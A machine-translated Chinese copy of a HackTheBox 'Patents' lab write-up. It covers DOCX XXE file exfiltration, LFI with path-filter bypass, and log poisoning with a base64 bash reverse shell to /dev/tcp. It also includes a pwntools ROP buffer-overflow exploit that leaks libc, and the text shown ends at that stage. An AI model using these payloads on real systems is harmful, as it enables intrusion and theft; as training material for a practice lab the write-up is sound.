<!doctype html>
<html class="no-js" lang="zh-CN">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🐑 👕 🤫 HackTheBox。正在通过专利。通过DOCX，LFI到RCE，GIT和ROP链文件进行XXE 🤱 🤙🏿 🙆🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="我将继续发布从HackTheBox网站发送的用于进一步处理的解决方案。
 
 在本文中，我们利用服务中的XXE将DOCX文档转换为PDF，通过LFI获取RCE，挖掘GIT历史记录并还原文件，使用pwntools组成ROP链并找到隐藏的根文件。
 
 通过VPN连接到实验室。建议不要从可用对您重要的数...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox。正在通过专利。通过DOCX，LFI到RCE，GIT和ROP链文件进行XXE</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/502268/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/3s/xg/mc3sxg5brnrlwn3qmajb37t8bhk.png" alt="图片"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我将继续发布从</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站发送的用于</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">进一步处理的</font></a><font style="vertical-align: inherit;">解决方案</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在本文中，我们利用服务中的XXE将DOCX文档转换为PDF，通过LFI获取RCE，挖掘GIT历史记录并还原文件，使用pwntools组成ROP链并找到隐藏的根文件。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
通过VPN连接到实验室。</font><font style="vertical-align: inherit;">建议不要从可用对您重要的数据的工作计算机或主机进行连接，因为您将与知道信息安全领域知识的人进入专用网络：)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织信息</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦察</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这台机器的IP地址为10.10.10.173，我将其添加到/ etc / hosts。</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.173    patents.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
首先，我们扫描开放端口。</font><font style="vertical-align: inherit;">由于使用nmap扫描所有端口需要很长时间，因此我将首先使用masscan进行此操作。</font><font style="vertical-align: inherit;">我们以每秒500个数据包的速度扫描来自tun0接口的所有TCP和UDP端口。</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.173 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7v/ex/jr/7vexjrz3cmdge_csif-0ruxstxy.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，有关在端口上运行的服务的更多详细信息，我们将使用-A选项运行扫描。</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A patents.htb -p22,80,8888</code></pre><br>
<img src="https://habrastorage.org/webt/nk/d8/jm/nkd8jml8rg_aau8otsuwznq-ab0.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
主机运行SSH服务和Apache Web服务器，并为不可理解的服务保留了端口8888。</font><font style="vertical-align: inherit;">让我们看看网络。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/q4/ba/lv/q4balvxmcp7ac3m0qqge2qtwhcm.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
该站点具有DOCX文档的下载表格。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/m4/xk/if/m4xkiftz0h6oxfikutspnmyijdy.png" alt="图片"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XXE DOCX</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
根据声明，我们的文档将转换为PDF格式。这暗示了XXE的思想。我</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这里</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">举了一个例子</font><font style="vertical-align: inherit;">。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/eg/mo/fo/egmofoq1l5r8ohdmorvwf83gsfe.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，在此示例中，主机将尝试从远程服务器下载xml文档。通过下载此文档，他将读取在已下载的xml文档中指定的本地文件，在base64中对其进行编码，然后将编码后的文件作为请求参数传递给我们的服务器，从而再次与其联系。也就是说，解码此参数后，我们从远程计算机获取文件。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是，不应将此负载放在word / document.xml路径上。由于OpenXML SDK用于处理这种类型的文档，因此</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这里开始</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这里开始</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，服务器端软件将在word / document.xml和customXML / item1.xml中搜索数据。因此，应将负载放置在此处。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们创建一个docx文档并将其解压缩为zip存档。之后，创建customXML目录并在其中创建item1.xml文件。在其中，我们将根据上图编写代码，将IP地址更改为我们自己的。然后我们将文档存档。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/s0/j_/gw/s0j_gwgd0ehur9mboxtcwz8eudg.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在运行本地Web服务器。</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后在当前目录中创建第二个xml文件，将/ etc / passwd指定为所需文件。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/6y/5s/l7/6y5sl7j1lcilayxrtbebn9z78tw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并将文档上传到服务器。在运行Web服务器的窗口中，我们将看到反向连接。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/fj/za/to/fjzatoxzmrvwpkccdyekqyig_ju.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
解码base64并获取所请求的文件。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ef/wy/ty/efwytya0_ldxuvv1qd9qjphrib0.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这样，我们可以读取服务器上的文件。让我们阅读Apache配置文件。为此，请更改dtd.xml并重复下载该文档。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/um/0q/xq/um0qxqy-zxbvhbbe-dgz2_05msy.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/-x/nf/zh/-xnfzhmk9bbhd8fjx5eko5vbaeg.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，我们找出了网站所在的目录。让我们尝试读取配置文件。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_b/dd/-v/_bdd-vrylmvfa98iklgx3lnykzi.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/pq/5l/ht/pq5lhtyyzajjcijlbaa0hubw5j4.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
评论说文件由于漏洞被重命名。我们当然会引用它为</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">patents.htb / getPatent_alphav1.0.php</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hq/wd/hj/hqwdhjf6zhjdaehc2zn6ic5p3hu.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
转到此页面并通过路径../../../../../etc/passwd作为id参数，所有出现的“ ../”将从我们的行中删除。</font><font style="vertical-align: inherit;">让我们用“ ... /。/”替换每一行“ ../”，因此，如果删除一个序列，它将仍然保留为“ ../”。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/fr/a3/pu/fra3pugykwho9xrl9xcklono1zg.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们找到了LFI。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入口点</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们尝试从中获得RCE。</font><font style="vertical-align: inherit;">坦率地说-这很困难。</font><font style="vertical-align: inherit;">事实是，发送此类文档时，我们没有收到下载PDF的报价。</font><font style="vertical-align: inherit;">也就是说，使用了描述符2（以文本形式显示诊断和调试消息）。</font><font style="vertical-align: inherit;">我们可以求助于他。</font><font style="vertical-align: inherit;">让我们在base64中编码反向shell：</font></font><br>
<br>
<pre><code class="bash hljs">/bin/bash -c <span class="hljs-string">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.211/4321 0&gt;&amp;1;'</span></code></pre><pre><code class="bash hljs">L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们将对其进行解码，并将其传递给php中的系统函数。</font><font style="vertical-align: inherit;">上传文件时，将代码作为HTTP标头传递。</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/convert.php -F <span class="hljs-string">"userfile=@file.docx"</span> -F <span class="hljs-string">'submit=Generate PDF'</span> --referer <span class="hljs-string">'http://test.com/&lt;?php system(base64_decode("L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn")); ?&gt;'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
运行netcat。</font></font><br>
<br>
<pre><code class="bash hljs">nc -lvp 4321</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在转到第二个描述符。</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//proc//self//fd//2</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们回到连接。 </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根1</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
加载脚本系统传输</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">linpea</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并仔细分析输出。</font><font style="vertical-align: inherit;">因此，我们在Docker容器中工作。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sa/hf/xz/sahfxzrubyathg6rglkqhwf0cvo.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们还会发现哈希。</font><font style="vertical-align: inherit;">但是黑客，我们一无所获。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/bf/cc/dy/bfccdyitk-1ksi7qmg5omq_lesw.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/dv/ss/up/dvssupnunggkpzz64gsfdxjveuw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，运行</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pspy64</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来跟踪正在运行的进程。</font><font style="vertical-align: inherit;">并且我们以root用户身份找到该过程的开始，其中密码作为环境变量进行传递。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/2_/yz/wi2_yzfeqgi3eehjxylmqf7k8vm.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并通过输入此密码在本地更改用户。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/iu/bi/yu/iubiyu543de3olgssz1ry-djuf4.png" alt="图片"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根2</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们看看该脚本的作用。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/vk/h-/ckvkh-wezr0ofumiqzzqakn5wog.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/rg/tf/rs/rgtfrsor5irhivfoifw-jr6c008.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们在一些lfmserver上获得了提示，并且还保存了用户名和密码。</font><font style="vertical-align: inherit;">让我们在系统中查找与lfm相关的所有内容。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/hz/ea/afhzea8jusqqac6irjgch6kyvjy.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们在此目录中找到了git存储库。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ln/h4/op/lnh4opchyrjvoc88mmg8kiwe7_y.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们使用此存储库。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/gq/by/ge/gqbygeqd2j4xoshvorswvluxkno.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们看看变化的历史。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/t7/ro/rj/t7rorjk0v42cfsjtphjd9uc1fs0.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们看看变化的历史。</font><font style="vertical-align: inherit;">因此，我们看到在倒数第二次提交中，添加了一个可执行文件和描述，最后，它们已被删除。</font><font style="vertical-align: inherit;">让我们回滚，然后再删除文件。</font></font><br>
<br>
<pre><code class="bash hljs">git revert 7c6609240f414a2cb8af00f75fdc7cfbf04755f5</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在我们的目录中，出现了一个可执行文件和说明。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ga/wc/4s/gawc4s_vovqdv6zz91jdrdbicfk.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/y5/ns/gi/y5nsgibu66e8a0_g_34mde9b2ao.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在这里，我已经想开始反转文件了，但是-我们有一个git项目！</font><font style="vertical-align: inherit;">我发现一个提到源代码的提交。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/7m/xr/ki/7mxrkibt8ixidkd4tir6ksasywk.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后还原文件。</font></font><br>
<br>
<pre><code class="bash hljs">git checkout 0ac7c940010ebb22f7fbedb67ecdf67540728123</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
之后，我们将感兴趣的源代码，程序本身和库下载到本地计算机。 </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">罗普</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们需要尝试查找和利用程序中的漏洞，有源代码可以帮助您。</font><font style="vertical-align: inherit;">让我们检查二进制文件中的保护。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/pq/fj/bd/pqfjbdyozi1qaxhxeauf1_hfcca.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
也就是说，缺少金丝雀和PIE，但堆栈不可执行。</font><font style="vertical-align: inherit;">使用方便的反编译器在任何反汇编程序中打开二进制文件（我使用IDA Pro 7.2），然后将反编译的代码与存储库中的源代码进行比较。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/rc/ue/tzrcued2khgzxq9jmhziq7vsfl4.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
要连接到服务器并使用来自checker.py文件的数据以及凭据。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xh/7b/aa/xh7baayunbtjue28qyfleddzqxc.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/-r/rp/mo/-rrpmoh0l0-hginwoubihqb3a_g.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们编写一个漏洞利用模板。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>)<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
username = <span class="hljs-string">"lfmserver_user"</span>
password = <span class="hljs-string">"!gby0l0r0ck$$!"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在确定请求。</font><font style="vertical-align: inherit;">启动应用程序。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wx/xj/iu/wxxjiuq1vfqmwzgrshyjzlmzzou.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您必须将路径发送到文件及其内容的哈希值。</font><font style="vertical-align: inherit;">例如，我使用了/ etc /主机。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/p0/3k/ek/p03kekiuesrd9mc2at4t_swcce0.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
将以下代码添加到模板。</font></font><br>
<br>
<pre><code class="python hljs">INPUTREQ = <span class="hljs-string">"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"</span>
file = <span class="hljs-string">"/etc/hosts"</span>
md5sum = <span class="hljs-string">"7d8fc74dc6cc8517a81a5b00b8b9ec32"</span><font></font>
send_ = INPUTREQ.format(file,username, password, md5sum)<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_.encode())<font></font>
<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在执行并得到404错误，</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/nd/b6/ejndb6z2tpkgvajgiq3akvwsbjg.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们看一下日志文件。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/d6/gf/qyd6gftg9f6m3ce87f9acdpsodc.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
很清楚，应用程序在哪里寻找文件，让我们一起研究路径并指定这样的文件。</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"../../../../../etc/hosts"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们将执行代码，并且不会看到任何错误。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/sp/o-/pxspo-1bkqx14dpydxmj11odvyo.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/id/8x/7z/id8x7zspwbcbv1u9qmx-ccjhiis.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是在urlencode的情况下，我们从服务器收到了代码为200的响应！</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts"</span></code></pre><br>
<img src="https://habrastorage.org/webt/uh/pt/s6/uhpts6ydsvnhutaadndkfzt_ejy.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
太好了，让我们回到反汇编程序。我们在（Shift + F12）行中发现了成功的服务器响应。让我们看看它的访问位置（X）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/ef/so/ckefsoopnkpezgsq6cdlguv7jh8.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们转到第一个功能，即一开始就对凭据进行验证。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/8v/6y/jg/8v6yjgpj94ih9fln0dmhbl3_zas.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们在反汇编器窗口中重命名变量行，以使其更容易在反编译器中理解。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/ut/vx/dzutvxrxvyv4tdq_zgldkiv9xqw.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后解析第18-24行中的代码，了解以下内容：用户输入的一部分属于函数sub_402DB9，在该函数中将字符串转换为变量名，然后该变量名进入访问函数，如果结果为负，则输出消息404.因此，变量名将是文件的路径。由于即使使用urlencode编码也处理了请求，因此解码很可能需要此功能。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mo/eb/wj/moebwjpolutcowo7qxeyi15dj-k.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是事实是，数据在其中传输的变量名称的大小有限。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u_/jz/ht/u_jzhtdqgp1vgp3qyuguunuxl_i.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，对于缓冲区溢出，我们需要传输0xA0 = 160字节。让我们在代码中添加最多增加160个字节并对文件的路径进行编码的功能。由于哈希是根据文件的内容计算得出的，因此有必要不破坏文件路径的完整性，即在主路径后添加0x00字节。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是事实是，我们需要从服务器上的任何文件中了解散列，该散列将始终可用并且永远不会更改。例如，/ proc / sys / kernel / randomize_va_space，正如我们从linPEAS的输出中回想的那样，ASLR被激活，也就是说，我们知道哈希值。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/dk/j_/tzdkj_hdn9owhtmod5ekklqior4.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后更改代码。</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">append_and_encode</span>(<span class="hljs-params">file, rop=<span class="hljs-string">b""</span></span>):</span>
    ret = <span class="hljs-string">b""</span>
    path = (file + <span class="hljs-string">b"\x00"</span>).ljust(<span class="hljs-number">160</span>, <span class="hljs-string">b"A"</span>) + rop
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<font></font>
        ret += <span class="hljs-string">b"%"</span> + hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">"0"</span>).encode()
    <span class="hljs-keyword">return</span> ret<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"error"</span>)<font></font>
<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
INPUTREQ = <span class="hljs-string">b"CHECK /{1} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n{2}\n"</span>
md5sum = <span class="hljs-string">b"26ab0db90d72e28ad0ba1e22ee510510"</span><font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>)<font></font>
send_= INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
它成功运作！</font></font><br>
<br>
<img src="https://habrastorage.org/webt/k9/4f/5v/k94f5vkgarkqukz9vhjiprkt1yo.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，让我们使用内存泄漏并确定libc库的加载地址。</font><font style="vertical-align: inherit;">为此，我们在已加载的libc库中获取写函数的地址。</font></font><br>
<br>
<pre><code class="python hljs">binary = ELF(<span class="hljs-string">"./lfmserver"</span>)<font></font>
libc = ELF(<span class="hljs-string">"./libc6.so"</span>)<font></font>
<font></font>
rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x6</span>, binary.got[<span class="hljs-string">'dup2'</span>])<font></font>
rop = flat(rop_binary.build())<font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)</code></pre><br>
<img src="https://habrastorage.org/webt/f0/5h/nl/f05hnlmsa7slih0sdwajq5kathy.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，选择dup2函数的地址（前8个字节）。</font><font style="vertical-align: inherit;">从中减去dup2函数在已卸载库中的地址。</font><font style="vertical-align: inherit;">这将找到libc的基地址。</font></font><br>
<br>
<pre><code class="python hljs">print(<span class="hljs-string">f"[*] Payload sent"</span>)<font></font>
<font></font>
recv_ = r.recvall().split(<span class="hljs-string">b'\r'</span>)<font></font>
leak = u64(recv_[<span class="hljs-number">-1</span>][:<span class="hljs-number">8</span>])<font></font>
print(<span class="hljs-string">f"[*] Leak address: <span class="hljs-subst">{hex(leak)}</span>"</span>)<font></font>
libc.address = leak - libc.symbols[<span class="hljs-string">'dup2'</span>]<font></font>
print(<span class="hljs-string">f"[+] Libc base: <span class="hljs-subst">{hex(libc.address)}</span>"</span>)</code></pre><br>
